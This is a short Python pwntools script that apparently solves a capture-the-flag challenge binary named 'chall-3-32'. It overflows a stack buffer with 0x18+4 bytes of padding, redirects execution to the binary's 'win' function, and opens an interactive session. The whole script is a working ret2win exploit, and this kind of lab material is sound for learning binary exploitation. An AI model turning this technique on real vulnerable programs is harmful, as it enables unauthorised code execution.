#!/usr/bin/env python3

from pwn import process, ELF, flat

io = process("./chall-3-32")

exe = ELF("./chall-3-32")

win = exe.symbols["win"]

pad = 0x18 + 4

payload = flat({
    pad: win,
})

io.sendlineafter(b"Buf: ", payload)

io.interactive()
